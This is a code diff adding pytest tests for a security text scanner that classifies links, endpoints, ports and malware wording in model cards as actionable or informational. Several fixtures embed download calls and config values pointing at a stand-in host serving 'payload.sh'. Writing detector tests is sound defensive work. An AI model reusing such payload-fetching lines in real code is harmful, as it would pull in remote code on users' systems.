@@ -2308,6 +2308,65 @@ def test_text_scanner_model_card_wrapped_long_literal_markdown_link_remains_acti
 
 
 @pytest.mark.parametrize(
+    "literal_prefix,literal_suffix",
+    [("", ""), ('r#"', '"#'), ("source ", ""), ("--url ", ""), ("r's ", "'"), ("'x' and's ", "'")],
+)
+def test_text_scanner_markdown_link_in_open_call_remains_actionable(
+    tmp_path: Path, literal_prefix: str, literal_suffix: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, f"download(\n    {literal_prefix}[download](https://evil.example/payload.sh){literal_suffix}\n)\n"
+    )
+
+
+@pytest.mark.parametrize("padding", [MAX_TEXT_FINDING_CONTEXT_BYTES - 16, MAX_TEXT_FINDING_CONTEXT_BYTES + 16])
+def test_text_scanner_long_prose_before_markdown_link_is_informational(tmp_path: Path, padding: int) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, "Documentation " + "a" * padding + " [guide](https://docs.example.com/reference)\n"
+    )
+
+
+@pytest.mark.parametrize("opening,closing", [("[", "]"), ("{", "}"), ("(", ")")])
+def test_text_scanner_indented_markdown_in_literal_remains_actionable(
+    tmp_path: Path, opening: str, closing: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, f"endpoint = {opening}\n    [payload](https://evil.example/payload.sh)\n{closing}\n"
+    )
+
+
+@pytest.mark.parametrize("quote", ["'", '"', "`"])
+def test_text_scanner_long_quoted_assignment_markdown_remains_actionable(tmp_path: Path, quote: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path,
+        f"endpoint = {quote}" + "padding " * 800 + f"[payload](https://evil.example/payload.sh){quote}\n",
+    )
+
+
+def test_text_scanner_many_escaped_assignment_fragments_before_prose_link(tmp_path: Path) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, '; x=\\"' * 4000 + '" See [guide](https://docs.example.com/reference)\n'
+    )
+
+
+@pytest.mark.parametrize("prefix", ["endpoint:\n", "endpoint =\n"])
+def test_text_scanner_long_indented_config_markdown_link_remains_actionable(tmp_path: Path, prefix: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, prefix + " " * (MAX_TEXT_FINDING_CONTEXT_BYTES + 16) + "[download](https://evil.example/payload.sh)\n"
+    )
+
+
+@pytest.mark.parametrize("padding", [MAX_TEXT_FINDING_CONTEXT_BYTES - 16, MAX_TEXT_FINDING_CONTEXT_BYTES + 16])
+@pytest.mark.parametrize("prefix,suffix", [('download("', '")'), ('endpoint = "', '"'), ('endpoint: "', '"')])
+def test_text_scanner_long_executable_markdown_link_stays_actionable(
+    tmp_path: Path, padding: int, prefix: str, suffix: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, prefix + "a" * padding + " [download](https://evil.example/payload.sh)" + suffix + "\n"
+    )
+
+
+@pytest.mark.parametrize(
     "content",
     [
         'download(\n"https://evil.example/payload.sh"\n)\n',
@@ -3536,6 +3595,26 @@ def test_text_scanner_documentation_possible_misuse_is_informational(tmp_path: P
 
 
 @pytest.mark.parametrize(
+    "suffix",
+    [" and is enabled by default.", "; it is enabled by default.", ". This capability is enabled by default."],
+)
+def test_text_scanner_possible_misuse_does_not_hide_same_line_admissions(tmp_path: Path, suffix: str) -> None:
+    _assert_documentation_network_actionable(
+        tmp_path, "Malware production may be possible" + suffix + "\n", "cc_pattern"
+    )
+
+
+def test_text_scanner_possible_misuse_with_compliance_guidance_is_informational(tmp_path: Path) -> None:
+    result = _scan_text_content(
+        tmp_path / "README.md",
+        "* **Misuse:** Other forms of misuse such as fraud, spam, or malware production may be possible, "
+        "and developers should ensure that their applications do not violate applicable laws and regulations.\n",
+    )
+    checks = [check for check in result.checks if check.details.get("pattern") == "malware"]
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+
+
+@pytest.mark.parametrize(
     "content",
     [
         'label = "malware production may be possible"\n',
@@ -3553,6 +3632,45 @@ def test_text_scanner_arxiv_identifier_is_not_a_telnet_port(tmp_path: Path) -> N
 
     assert not any(check.details.get("type") == "suspicious_port" for check in result.checks)
     assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize("later_port", [False, True])
+def test_text_scanner_port_retarget_skips_longer_numbers(tmp_path: Path, later_port: bool) -> None:
+    content = 'SSH uses port 23.\nendpoint = "arxiv:2310.06825"\n'
+    if later_port:
+        content += "endpoint = 'host:23'\n"
+    result = _scan_text_content(tmp_path / "README.md", content)
+    checks = [check for check in result.checks if check.details.get("type") == "suspicious_port"]
+    assert checks
+    assert all(
+        check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        if later_port
+        else check.severity == IssueSeverity.INFO
+        for check in checks
+    )
+    if later_port:
+        assert checks[0].details["position"] == (tmp_path / "README.md").read_bytes().rindex(b"23")
+
+
+def test_text_scanner_port_retarget_exact_budget_ignores_longer_numbers() -> None:
+    payload = b'SSH uses port 23.\nendpoint = "arxiv:2310.06825"\n'
+    finding = {"type": "suspicious_port", "port": 23, "position": payload.index(b"23"), "severity": "MEDIUM"}
+    _classified, incomplete, remaining = TextScanner._retarget_documentation_finding(
+        payload, payload.lower(), finding, remaining_occurrences=1, allow_exhaustion_probe=True
+    )
+    assert incomplete is False
+    assert remaining == 0
+
+
+def test_text_scanner_port_retarget_includes_earlier_pattern_variants(tmp_path: Path) -> None:
+    content = 'endpoint = "port=23"\nReference host:23 is documented.\n'
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("type") == "suspicious_port"
+        and check.details.get("position") == content.index("23")
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
 
 
 @pytest.mark.parametrize(
@@ -3575,6 +3693,25 @@ def test_text_scanner_multiline_documentation_html_links_are_informational(
 ) -> None:
     _assert_model_card_endpoint_informational(
         tmp_path, f'<{tag}\n    {attribute}="https://docs.example.com/reference"\n>\n'
+    )
+
+
+@pytest.mark.parametrize("tag,attribute", [("a", "href"), ("img", "src")])
+@pytest.mark.parametrize("prefix", ["<endpoint>\n", 'endpoint = "\n', "endpoint:\n", "download(\n"])
+def test_text_scanner_passive_html_in_config_remains_actionable(
+    tmp_path: Path, tag: str, attribute: str, prefix: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, prefix + f'<{tag}\n    {attribute}="https://evil.example/payload.sh">\n'
+    )
+
+
+@pytest.mark.parametrize("tag,attribute", [("a", "href"), ("img", "src")])
+def test_text_scanner_passive_html_after_closed_config_is_informational(
+    tmp_path: Path, tag: str, attribute: str
+) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, "<endpoint>local</endpoint>\n" + f'<{tag}\n    {attribute}="https://docs.example.com/reference">\n'
     )
 
 
